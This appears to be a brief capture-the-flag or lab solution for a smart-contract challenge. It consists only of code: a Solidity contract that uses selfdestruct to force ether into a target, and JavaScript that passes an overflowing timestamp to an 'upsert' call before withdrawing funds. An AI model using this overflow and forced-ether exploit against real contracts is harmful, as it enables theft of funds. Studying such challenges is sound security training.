## Description

```
contract Attack {
    function Attack(address _contract) public payable {
        selfdestruct(_contract);
    }
}
```

```
const overflow = BigNumber.from(2).pow(256).sub(24 * 60 * 60);
await target.upsert(1, overflow, { value: 1 });

await target.upsert(2, 0, { value: 2 });
tx = await target.withdraw(2);
```